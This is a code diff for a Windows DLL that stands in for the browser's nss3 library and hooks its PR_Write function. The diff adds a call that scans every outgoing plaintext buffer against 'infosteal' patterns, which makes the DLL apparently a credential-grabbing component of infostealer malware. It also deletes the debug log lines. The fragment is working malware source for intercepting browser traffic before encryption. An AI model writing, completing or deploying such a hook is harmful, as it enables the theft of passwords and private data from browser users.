@@ -1,13 +1,17 @@
 #include "intercepted.h"
 #include "proxied.h"
+#include "extract/extract.h"
 #include "types/types.h"
+#include "conf/infosteal_patterns.h"
 #include "logging/logging.h"
 
 pr_io_func pr_write_orig = 0;
 pr_io_func pr_read_orig = 0;
 
 int myPR_WRITE(void* fd, void* buf, int amnt) {
-	LOG("write was called");
+
+	extract_info(buf, conf::infosteal_patterns,amnt);
+
 	int f = pr_write_orig(fd, buf, amnt);
 	return f;
 };
@@ -23,8 +27,6 @@ BOOL WINAPI DllMain(HINSTANCE mod, DWORD fdwReason, LPVOID resv) {
 	if (fdwReason == DLL_PROCESS_ATTACH){
 
 		INITLOG();
-
-		LOG("dllmain called with PROCESS_ATTACH");
 
 		//load functions from original dll (eventually threaded)
 		HINSTANCE hGetProcIDDLL = LoadLibraryA("nss3.orig");
